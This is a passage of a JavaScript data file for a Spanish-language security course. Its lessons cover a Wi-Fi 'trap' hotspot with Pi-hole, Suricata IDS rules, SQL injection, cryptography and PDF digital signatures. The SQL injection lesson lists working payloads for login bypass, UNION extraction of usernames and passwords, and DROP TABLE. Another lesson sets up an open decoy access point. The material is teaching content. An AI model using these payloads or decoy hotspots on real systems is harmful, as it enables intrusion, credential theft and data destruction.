      { command: "iwconfig", description: "Verificar si la interfaz inalámbrica (ej. `wlan0`) se encuentra en `Mode:Monitor`. Si dice `Mode:Managed`, debes cambiarla con el siguiente comando." },
      { command: "sudo ifconfig wlan0 down && sudo iwconfig wlan0 mode monitor && sudo ifconfig wlan0 up", description: "(EJECUTAR SOLO SI ESTÁ EN MODO MANAGED): Apaga la tarjeta, la fuerza a entrar en modo monitor y la vuelve a encender. Cambia `wlan0` en el comando si tu interfaz tiene otro nombre. Vuelve a ejecutar `iwconfig` para confirmar." },
      { command: "wihotspot", description: "Lanzar la interfaz gráfica para crear el punto de acceso (SSID, Password, Interfaces)." },
      { command: "", description: "(NOTA) Configuración de Wi Hotspot (GUI)\n1. SSID: Cambia el nombre de tu red falsa (ej. `WifiGratis`).\n2. Password: Pon una clave o marca `Open` para dejarla abierta (recomendado para trampas).\n3. Wifi interface: Asegúrate de que dice `wlan0` (o el nombre de tu antena).\n4. Internet interface: Pon `eth0` (por donde recibes internet para compartirlo).\n5. Haz clic en `Create hotspot`." },
      { command: "curl -sSL https://install.pi-hole.net | PIHOLE_SKIP_OS_CHECK=true sudo -E bash", description: "Instalar Pi-hole forzando la compatibilidad con el sistema operativo actual." },
      { command: "", description: "(NOTA) Asistente de Instalación Pi-hole (Pantallas Azules)\n1. Presiona `ENTER` (Aceptar/Continue) en las pantallas iniciales y de donación.\n2. Static IP Needed: Te dirá que necesitas una IP estática, selecciona `<Continue>`.\n3. Choose An Interface: Selecciona `eth0` (marcada con asterisco) y presiona `<Aceptar>`.\n4. Upstream DNS Provider: Elige `Google` (o Cloudflare) y presiona `<Aceptar>`.\n5. Blocklists (StevenBlack): Te preguntará si deseas incluirla, selecciona `<Sí>`.\n6. IP Settings / Admin Webpage / Logging: A todas las preguntas de confirmación e instalación, selecciona `<Sí>` para encender todo.\n7. Privacy mode para FTL: Selecciona `0 Show everything` y presiona `<Continue>`.\n8. ¡MUY IMPORTANTE! En la última pantalla aparecerá tu `Admin Webpage login password`. Tómale foto o anótala, la necesitarás para entrar al panel." },
      { command: "pihole -a -p \"\"", description: "(Opcional): Quitar completamente la contraseña del panel de Pi-hole. Esto es ideal para el entorno de laboratorio, así evitamos que olvides la clave y entramos directo al panel sin iniciar sesión." },
      { command: "xdg-open http://localhost/admin", description: "Abre el navegador web directamente en el panel de administración de Pi-hole. Ingresa con la contraseña que acabas de configurar y verifica que el dashboard cargue correctamente." },
      { command: "", description: "(NOTA) Añadir dominios a la Blocklist (Normal vs RegEx)\nPara bloquear sitios web en Pi-hole, ve al menú lateral 'Domains'. Aquí tienes dos pestañas clave:\n1. Pestaña 'Domain': Sirve para bloquear una dirección exacta (Ej. `www.facebook.com`). Si la víctima entra a `login.facebook.com`, NO será bloqueada porque no es una coincidencia exacta.\n2. Pestaña 'RegEx filter': Sirve para bloquear patrones. Si añades `.*facebook.*`, bloquearás automáticamente CUALQUIER subdominio o página que contenga la palabra 'facebook'.\n💡 Revisa la 'Pregunta Frecuente' (FAQ) de esta lección para una explicación técnica más detallada sobre la diferencia entre ambos métodos." }
    ],
    faqs: [
      { 
        question: "Pregunta Frecuente: ¿Cuál es la diferencia técnica entre bloquear por 'Domain' y bloquear por 'RegEx filter' en Pi-hole?", 
        answer: "Bloquear por **Domain (Dominio Exacto)** significa que Pi-hole solo interceptará la URL precisa que escribiste. Por ejemplo, si bloqueas `falabella.com.pe` como Domain, la víctima aún podrá acceder a `www.falabella.com.pe` (porque le añadió el `www.`) o a `login.falabella.com.pe`.\n\nEn cambio, el **RegEx filter (Expresión Regular)** funciona como un comodín inteligente y avanzado. Al usar un patrón matemático, le indicas al motor que busque coincidencias flexibles.\n\n**Simbología básica de RegEx en Pi-hole:**\n- `.` (Punto): Representa CUALQUIER carácter. Si quieres un punto literal (como en .com), debes escaparlo así: `\\.`\n- `*` (Asterisco): El carácter anterior se repite cero o más veces. `.*` significa 'cualquier texto'.\n- `^` (Circunflejo): Indica el inicio exacto del dominio.\n- `$` (Dólar): Indica el final exacto del dominio.\n- `|` (Barra vertical / Pipe): Significa 'O' lógico (OR). Ej: `(a|b)` significa 'a' o 'b'.\n- `()` (Paréntesis): Agrupa condiciones.\n\n**Ejemplo Oficial (Recomendado):** El filtro RegEx `(\\.|^)youtube\\.com$` es la estructura matemática estándar para bloquear dominios de forma segura. Le dice a Pi-hole: *'Bloquea cualquier petición que termine exactamente en youtube.com ($), pero asegúrate de que antes de la palabra youtube haya un punto literal (\\.) O (|) que sea el inicio exacto de la petición (^)'*. Esto bloquea `youtube.com` y `www.youtube.com`, pero evita bloquear páginas legítimas que solo contengan la palabra, como `amoyoutube.com`.\n\n**Ejemplo Oficial para Falabella:** Siguiendo la misma estructura recomendada arriba, para bloquear Falabella de manera segura (incluyendo todos sus subdominios) la RegEx correcta sería `(\\.|^)falabella\\.com\\.pe$`. Esto bloquea `falabella.com.pe`, `www.falabella.com.pe` y `login.falabella.com.pe`, pero evita falsos positivos.\n\n**Ejemplo Agresivo (Comodín Total):** Si usas el filtro `.*falabella.*`, le estás diciendo a Pi-hole: *'Bloquea cualquier petición que contenga la palabra falabella en cualquier parte'*. Esto bloqueará instantáneamente lo anterior, pero también sitios como `api.falabella.com`, `falabellaseguros.net` o un blog externo llamado `mimalaeperienciaconfalabella.com`." 
      }
    ]
  },
  {
    id: 9,
    title: "Clase 9: Sistemas de Detección IPS/IDS (Suricata & Monitoreo SIEM)",
    subtitle: "Detección temprana de intrusos con Suricata y procesamiento centralizado de alertas",
    duration: "4 horas",
    difficulty: "Avanzado",
    category: "Detección & SIEM",
    summary: "Monitoreo en tiempo real de interfaces de red con Suricata, personalización de reglas de detección firmas y recopilación de alertas de seguridad del sistema.",
    isIgnored: false,
    theory: {
      objectives: [
        "Establecer diferencias funcionales entre un IDS (Detección) y un IPS (Prevención).",
        "Instalar y configurar Suricata para la lectura pasiva de tramas físicas de red.",
        "Crear reglas específicas con firmas adaptadas para identificar ataques DDoS, escaneos Nmap o SQLi.",
        "Visualizar logs centralizados de formato JSON (eve.json) para análisis forense informático."
      ],
      introduction: "Un firewall tradicional bloquea puertos, pero no analiza el contenido del tráfico legítimo (como una petición HTTP maliciosa). Los Sistemas de Detección de Intrusos (IDS) analizan las firmas del tráfico web en tiempo real. Suricata examina exhaustivamente cada paquete entrante buscando patrones que coincidan con firmas conocidas de ataques informáticos. Al detectar una anomalía, genera una alerta inmediata que alimenta a un sistema SIEM (Security Information and Event Management) para alertar al departamento de SOC.",
      keyConcepts: [
        { title: "IDS vs IPS", description: "Un IDS (Intrusion Detection System) detecta y alerta pasivamente sobre actividades maliciosas. Un IPS (Intrusion Prevention System) toma medidas proactivas, como descartar el paquete del canal de comunicación." },
        { title: "Firmas de Suricata", description: "Reglas estructuradas compuestas de encabezados (acción, protocolo, IPs de origen/destino) y opciones (payload de texto, identificador SID, severidad del incidente)." },
        { title: "Archivo eve.json", description: "El registro estandarizado de eventos de Suricata. Contiene todos los metadatos de las alertas en un formato estructurado perfecto para ser procesado por herramientas de SIEM como Wazuh." }
      ]
    },
    commands: [
      { command: "sudo apt install suricata", description: "Instalar el motor IDS/IPS Suricata de código abierto de alto rendimiento." },
      { command: "sudo suricata -c /etc/suricata/suricata.yaml -i wlan0mon", description: "Iniciar el motor Suricata vinculándolo a la interfaz inalámbrica en modo monitor para interceptar anomalías." },
      { command: "echo 'alert icmp any any -> any any (msg:\"Ataque de Ping Detectado\"; sid:1000001; rev:1;)' >> /etc/suricata/rules/local.rules", description: "Añadir una regla básica para alertar inmediatamente si se recibe cualquier paquete de diagnóstico de red ICMP (ping)." },
      { command: "sudo suricata-update", description: "Actualizar automáticamente la base de datos de firmas comunitarias de amenazas globales y exploits conocidos." },
      { command: "tail -f /var/log/suricata/eve.json | grep -i alert", description: "Monitorear en tiempo real el log estructurado buscando patrones de alertas gatilladas para diagnóstico." }
    ]
  },
  {
    id: 10,
    title: "Clase 10: Evaluación Final de Redes",
    subtitle: "Examen práctico de configuraciones y defensas perimetrales",
    duration: "1 hora",
    difficulty: "Teórico",
    category: "Detección & SIEM",
    summary: "Segunda evaluación teórica enfocada en las clases de ingeniería social, firewalls, configuraciones de IDS Suricata y DMZ.",
    isIgnored: true,
    theory: {
      objectives: [
        "Comprobar el conocimiento sobre el rol de un DNS Sinkhole en la red local.",
        "Analizar arquitecturas seguras con DMZ frente a conexiones externas del servidor.",
        "Validar la sintaxis de alertas para firmas de seguridad de Suricata."
      ],
      introduction: "Evaluación formal para consolidar los conocimientos defensivos y perimetrales. Certifica la madurez técnica antes de ingresar a los laboratorios de seguridad de código, inyecciones de bases de datos y criptografía asimétrica.",
      keyConcepts: [
        { title: "Repaso defensivo", description: "Preguntas de opción múltiple con casos lógicos reales de intrusiones corporativas." },
        { title: "Evaluación conceptual", description: "Medición rápida de comprensión sobre la jerarquía de un centro de operaciones de seguridad (SOC)." }
      ]
    }
  },
  {
    id: 11,
    title: "Clase 11: Inyecciones SQL (SQLi Sandbox)",
    subtitle: "Auditoría de vulnerabilidades en aplicaciones web y explotación interactiva de bases de datos",
    duration: "4 horas",
    difficulty: "Intermedio",
    category: "Desarrollo Seguro",
    summary: "Análisis de inyecciones SQL basadas en errores o booleanos, evasión de inicio de sesión clásica mediante consultas modificadas, y estudio de labs de PortSwigger.",
    isIgnored: false,
    theory: {
      objectives: [
        "Comprender el funcionamiento de la inyección de código SQL dinámico en variables web inseguras.",
        "Aprender a evadir validaciones de autenticación de login sin conocer claves legítimas.",
        "Utilizar comandos de inyección tipo UNION para mapear tablas de bases de datos privadas.",
        "Implementar defensas activas mediante el uso exclusivo de consultas preparadas (Prepared Statements)."
      ],
      introduction: "La inyección SQL (SQLi) es una de las fallas más comunes de la seguridad de aplicaciones web. Ocurre cuando los datos proporcionados por el usuario se concatenan directamente en la consulta SQL de la aplicación, en lugar de tratarse como parámetros aislados. Esto permite al atacante manipular la estructura lógica de la consulta del motor de la base de datos, logrando evadir formularios de login, acceder a información clasificada, borrar tablas enteras o, en casos extremos, ejecutar comandos a nivel de sistema operativo.",
      keyConcepts: [
        { title: "Concatenación Insegura", description: "Construir consultas uniendo cadenas directas, ej: `SELECT * FROM users WHERE pass = '` + user_input + `'`. Permite inyectar caracteres de control como la comilla simple (`'`)." },
        { title: "Evasión de Autenticación", description: "Bypass lógico usando sentencias que siempre se evalúan como verdaderas (ej. `' OR '1'='1`), obligando al motor de BD a retornar un registro válido sin requerir contraseña." },
        { title: "Tipos de Inyección", description: "Existen tres tipos principales: In-Band (los resultados se ven en la misma web, como UNION y Error-Based), Inferential / Blind (no hay resultados visibles, se infiere por el tiempo de respuesta o cambios booleanos), y Out-of-Band (se obliga al servidor a hacer una petición DNS/HTTP externa con los datos)." },
        { title: "Consultas Preparadas", description: "La medida preventiva estándar. El motor de BD compila la estructura de la consulta antes de insertar los parámetros, neutralizando cualquier código SQL inyectado como simple texto plano." }
      ]
    },
    commands: [
      { command: "", description: "(NOTA) Bypass de Login: Inyectar la carga útil `' OR 1=1--` en el campo de usuario. El motor evalúa la condición `1=1` como Verdadera para cada registro de la tabla, devolviendo el primer usuario (generalmente el Administrador) y permitiendo entrar sin la contraseña correcta." },
      { command: "", description: "(NOTA) Revelar Datos Ocultos: Inyectar `'+OR+1=1--` directamente en el parámetro de la URL (ej. `?category='+OR+1=1--`). La cláusula WHERE se manipula para devolver todos los productos del catálogo, incluyendo los ocultos o no lanzados." },
      { command: "", description: "(NOTA) Inyección UNION: Usar el operador UNION para combinar los resultados de la consulta original con una consulta inyectada como `' UNION SELECT username, password FROM users--`. Esto permite exfiltrar información de otras tablas." },
      { command: "", description: "(NOTA) Consulta Destructiva (DROP): Terminar la consulta original con un punto y coma `;` y encadenar una sentencia destructiva como `DROP TABLE products--`. Si la base de datos permite múltiples sentencias, esto borrará la tabla entera." }
    ],
    additionalInfo: "Adicionalmente a los laboratorios integrados de esta maqueta interactiva, el profesor recomienda crear una cuenta gratuita en PortSwigger Web Security Academy (https://portswigger.net/) para realizar los laboratorios avanzados interactivos de SQL Injection en un ambiente en la nube real.",
    faqs: [
      { question: "¿Por qué el doble guion (--) al final de la inyección?", answer: "El doble guion es un comentario en SQL. Le indica al motor de base de datos que ignore el resto de la consulta original programada por el desarrollador (como la verificación de la contraseña), evitando errores de sintaxis." },
      { question: "¿Qué pasa si no sé el nombre de las columnas para hacer un UNION?", answer: "Los atacantes usan comandos como 'ORDER BY 1', 'ORDER BY 2', etc., hasta que la base de datos devuelve un error. Así averiguan la cantidad exacta de columnas. Luego usan herramientas como 'sqlmap' para automatizar la extracción de nombres de tablas y columnas del esquema de información (information_schema)." },
      { question: "¿Son suficientes las Consultas Preparadas?", answer: "Son la defensa principal y casi infalibles si se aplican consistentemente. Sin embargo, en bases de datos antiguas o frameworks mal configurados, los atacantes pueden buscar inyecciones de segundo orden (Second-Order SQLi) u otros vectores. El principio de 'Defensa en Profundidad' sugiere complementar con validación de entradas y un WAF (Web Application Firewall)." }
    ]
  },
  {
    id: 12,
    title: "Clase 12: Criptografía (Llave Simétrica y Asimétrica)",
    subtitle: "Cifrado de datos en tránsito y reposo mediante algoritmos AES y RSA corporativos",
    duration: "3 horas",
    difficulty: "Intermedio",
    category: "Criptografía",
    summary: "Estudio detallado del cifrado simétrico (llave compartida veloz) y asimétrico (pares de llaves pública y privada), analogías físicas reales y simulaciones matemáticas.",
    isIgnored: false,
    theory: {
      objectives: [
        "Comprender los principios de confidencialidad e integridad criptográfica de datos.",
        "Analizar el flujo de trabajo de la criptografía de clave secreta única (Simétrica - AES).",
        "Aprender a operar la infraestructura de clave pública (Asimétrica - RSA).",
        "Resolver el problema de la distribución de llaves empleando esquemas híbridos modernos."
      ],
      introduction: "La criptografía es la ciencia de aplicar matemáticas complejas para proteger datos y comunicaciones para que solo las partes interesadas puedan leerlos. El cifrado simétrico (como AES) utiliza la misma clave para cifrar y descifrar, lo cual es veloz pero peligroso para transferir en canales inseguros. Por otro lado, la criptografía asimétrica (como RSA) utiliza una pareja de llaves únicas por usuario: una pública (que cualquiera puede conocer para enviarnos mensajes cifrados) y una privada (que guardamos bajo estricta seguridad para descifrar dichos mensajes).",
      keyConcepts: [
        { title: "Cifrado Simétrico (AES)", description: "Estándar de Cifrado Avanzado que utiliza llaves de 128, 192 o 256 bits. Altamente eficiente para grandes volúmenes de datos o discos duros cifrados." },
        { title: "Cifrado Asimétrico (RSA)", description: "Algoritmo basado en la dificultad matemática de factorizar grandes números primos. Resuelve la entrega segura de llaves en redes inseguras de internet." },
        { title: "La Analogía del Buzón", description: "La clave pública es como la ranura de entrada del buzón: cualquiera en la calle puede insertar una carta (cifrado). La clave privada es la llave física para abrir la puerta trasera del buzón: solo el dueño puede extraer y leer las cartas (descifrado)." },
        { title: "Intercambio Diffie-Hellman", description: "Método matemático que permite a dos partes que no se conocen crear y compartir una Llave Secreta Simétrica en un canal público interceptado, sin que un atacante pueda deducirla. Usa la analogía de mezclar colores de pintura." }
      ]
    },
    faqs: [
      { question: "En resumen, ¿cuáles son las diferencias clave entre el Cifrado Simétrico y el Asimétrico?", answer: "Existen 3 diferencias fundamentales:\n\n1. Llaves: El simétrico usa UNA SOLA llave compartida (la misma para cerrar y abrir el cofre). El asimétrico usa un PAR de llaves vinculadas matemáticamente (una Pública para cifrar y una Privada para descifrar).\n\n2. Velocidad y Eficiencia: El simétrico (como AES) es extremadamente rápido, ideal para cifrar discos duros enteros, bases de datos masivas o streaming de video. El asimétrico (como RSA) es muy lento y pesado matemáticamente, por lo que no sirve para grandes volúmenes de datos.\n\n3. Propósito Principal: El simétrico se usa para proteger la confidencialidad de la data masiva. El asimétrico se usa para resolver el problema de cómo enviarnos la llave simétrica sin que nos la roben por internet, y también sirve para firmar documentos digitalmente (demostrar tu identidad)." },
      { question: "¿Cómo funciona la 'Analogía de la Pintura' en Diffie-Hellman?", answer: "Imagina que Alicia y Bob acuerdan públicamente un color (Amarillo). Cada uno elige un color secreto (Alicia: Rojo, Bob: Azul) y lo mezcla con el público. Alicia envía su mezcla (Naranja) y Bob la suya (Verde) por internet. El hacker ve esos colores pero no puede 'desmezclar la pintura' para saber los secretos. Finalmente, Alicia mezcla su secreto (Rojo) con el Verde de Bob, y Bob mezcla su secreto (Azul) con el Naranja de Alicia. ¡Ambos obtienen exactamente el mismo color final (Marrón)! Esa será su Llave Simétrica compartida, y el hacker jamás podrá obtenerla." },
      { question: "¿Por qué no usamos exclusivamente Cifrado Asimétrico si no requiere compartir llaves previas?", answer: "Porque el cifrado asimétrico (RSA) requiere cálculos muy pesados, siendo hasta 1000 veces más lento. En la práctica, se usa un esquema híbrido: se emplea Asimétrico (o Diffie-Hellman) solo para intercambiar de forma segura una Llave Simétrica temporal, y luego toda la transferencia de datos masivos (ej. streaming de video) se cifra con la llave Simétrica (AES) por su tremenda velocidad." }
    ]
  },
  {
    id: 13,
    title: "Clase 13: Firma Electrónica, Digital y Certificados",
    subtitle: "Integridad y No Repudio de archivos digitales mediante firmas criptográficas",
    duration: "3 horas",
    difficulty: "Avanzado",
    category: "Criptografía",
    summary: "Creación y validación de firmas digitales basadas en hashing seguro (SHA-256) y encriptación asimétrica para garantizar la no alteración de documentos PDF.",
    isIgnored: false,
    theory: {
      objectives: [
        "Diferenciar legal y técnicamente entre una firma electrónica simple y una firma digital criptográfica.",
        "Comprender el concepto de integridad matemática de datos mediante funciones Hashing (SHA).",
        "Implementar flujos de firma digital: cifrado del hash del documento con la clave privada.",
        "Verificar de forma autónoma la validez de los certificados informáticos y metadatos de autoría."
      ],
      introduction: "La firma digital es una técnica criptográfica que garantiza la integridad del contenido de un archivo y asocia la autoría de un documento con un firmante específico, impidiendo que este pueda negar la autoría de la firma (No Repudio). El proceso consiste en aplicar una función de resumen (hashing SHA-256) al documento original para obtener una 'huella única'. Dicha huella es cifrada utilizando la clave privada del emisor. Si un solo byte del documento firmado es alterado, el hash variará drásticamente, haciendo que la firma se detecte como inválida en el validador.",
      keyConcepts: [
        { title: "Firma Electrónica vs. Firma Digital", description: "¡CUIDADO! No son lo mismo. La 'Firma Electrónica' es un concepto legal general (como un pin, una firma escaneada o un click en 'acepto'). En cambio, la 'Firma Digital' es la tecnología criptográfica estricta (hashing y cifrado asimétrico) que garantiza matemáticamente que el documento no fue alterado y quién fue el autor exacto." },
        { title: "Función Hash", description: "Algoritmo matemático que convierte cualquier volumen de datos en una cadena de caracteres única de longitud fija. Es unidireccional y libre de colisiones estándar." },
        { title: "No Repudio", description: "Garantía de que el emisor de una firma digital no puede negar haber firmado el documento, ya que solo su clave privada secreta pudo haber creado la firma verificable." },
        { title: "Certificado Digital", description: "Documento digital expedido por una Autoridad de Certificación de confianza que asocia una clave pública con la identidad real de una persona física o jurídica." }
      ]
    },
    faqs: [
      { question: "¿Si envío un documento firmado y alguien le cambia el nombre al archivo, la firma digital se rompe?", answer: "En la vida real, NO. La inmensa mayoría de protocolos (como las firmas internas de PDF) aplican el algoritmo matemático Hash EXCLUSIVAMENTE a los bytes del contenido interno del documento, no a los metadatos del Sistema Operativo como el nombre del archivo. Por lo tanto, si firmas 'contrato_final.pdf' y alguien lo renombra a 'borrador.pdf' sin alterar su contenido, la firma criptográfica seguirá siendo 100% válida." },
      { question: "¿Cómo puedo eliminar un certificado casero que creé por error o que ya no uso?", answer: "Los certificados creados con SELFCERT se guardan en el almacén interno de Windows. Para borrar uno: \n1. Presiona `Windows + R`.\n2. Escribe `certmgr.msc` y presiona Enter.\n3. En la ventana que se abre, despliega la carpeta 'Personal' (arriba a la izquierda) y luego entra a 'Certificados'.\n4. Busca tu certificado en la lista, dale clic derecho y elige 'Eliminar'. ¡Y listo, ya no aparecerá en Acrobat!" }
    ],
    commands: [
      { command: "", description: "(NOTA) (Paso 1) CREAR CERTIFICADO CASERO: Ve a la ruta `C:\\Program Files\\Microsoft Office\\root\\Office16\\SELFCERT.EXE` en tu computadora. Ejecuta la herramienta y crea un certificado con tu nombre." },
      { command: "", description: "(NOTA) (Paso 2) USAR ACROBAT PARA FIRMAR: Descarga y abre tu documento PDF en Adobe Acrobat. Ve a la sección 'Todas las herramientas' (o pulsa 'Ver más'), y selecciona 'Utilizar un certificado'. Luego, haz clic en 'Firmar digitalmente'. El sistema te pedirá hacer clic y arrastrar para delimitar el área donde deseas que aparezca la firma. Finalmente, elige de la lista el certificado personal (ID digital de Windows) que creaste previamente con SELFCERT y pulsa 'Firmar'." },
      { command: "", description: "(NOTA) (Paso 3) CONFIGURAR FIRMA ONPE: Instala el software 'Firma ONPE'. Luego, ve a la pestaña 'Archivo ONPE' en este laboratorio para descargar el archivo TSL requerido y pégalo exactamente en la dirección `C:\\Users\\(TU_USUARIO)\\.firmaONPE\\cache`." },
      { command: "", description: "(NOTA) (Paso 4) VALIDACIÓN: Abre tu PDF firmado con Acrobat utilizando el software de Firma ONPE. Dale a 'Verificar'. El sistema validará tu firma casera gracias al archivo caché que acabas de colocar." }
    ]
  }
];
